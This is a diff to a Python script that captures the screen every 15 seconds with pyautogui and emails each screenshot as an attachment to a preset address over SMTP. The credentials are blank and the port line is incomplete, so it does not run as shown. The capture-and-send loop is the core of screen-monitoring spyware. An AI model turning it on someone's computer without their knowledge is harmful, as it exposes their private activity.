@@ -3,43 +3,81 @@ import time
 import os 
 import smtplib
 import ssl
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email import encoders
 
-smtpServer = ""
+
+
+smtpURL = ""
+smtpPort = 
 sender_email = ""
 receiver_email = ""
 password = ""
-message = """\
-From: %s
-Subject: Hi there
 
-This message is sent from Python.""" % sender_email
 
-def sendEmail(sender, receiver, password, message, smtpServer):
+
+
+def sendEmail(sender, receiver, password, subject, messageBody, filename, smtpURL, smtpPort):
    
+    message = MIMEMultipart()
+    message["From"] = sender
+    message["To"] = receiver
+    message["Subject"] = subject
+
+    message.attach(MIMEText(messageBody, "plain"))
+
+    # Open the file in binary mode
+    with open(filename, "rb") as attachment:
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+
+    # Encode file in ASCII characters to send via email
+    encoders.encode_base64(part)
+
+    # Add header as key/value pair to attachment part
+    part.add_header(
+        "Content-Disposition",
+        f"attachment; filename= {filename}",
+    )
+
+    # Add attachment to message and convert message to string
+    message.attach(part)
+    text = message.as_string()
+
+
     # Create a secure SSL context
     context = ssl.create_default_context()
 
-    # Try to log in to server and send email
     try:
-        server = smtplib.SMTP_SSL(smtpServer, 465, context=context)
+        server = smtplib.SMTP_SSL(smtpURL, smtpPort, context=context)
         server.login(sender_email, password)
-        server.sendmail(sender_email, receiver_email, message)
-    except Exception as e:
-        # Print any error messages to stdout
+        server.sendmail(sender_email, receiver_email, text)
+    except Exception as e:   
         print(e)
     finally:
-        server.quit() # Close the connection
+        server.quit()
 
-print("---")
-if not os.path.isdir('tmp'):
-    os.mkdir("tmp")
 
-i = 1
-while True:
-    screenshot = pyautogui.screenshot()
-    screenshot.save(f"tmp/{i}.png")
-    print(f"screen captured {i}")
-    sendEmail(sender_email, receiver_email, password, message, smtpServer)
-    i=i+1
-    time.sleep(2)
+def main():
+    print("---")
 
+    if not os.path.isdir('tmp'):
+        os.mkdir("tmp")
+        print("tmp directory created")
+
+    screenshotNumber = 1
+    while True:
+        screenshot = pyautogui.screenshot()
+        screenshot.save(f"tmp/{screenshotNumber}.png")
+        print(f"screen captured {screenshotNumber}")
+        
+        subject = f"Screenshot {screenshotNumber}"
+        messageBody = f"chuj."
+        sendEmail(sender_email, receiver_email, password, subject, messageBody, f"tmp/{screenshotNumber}.png", smtpURL, smtpPort)
+
+        screenshotNumber+=1
+        time.sleep(15)
+
+main()
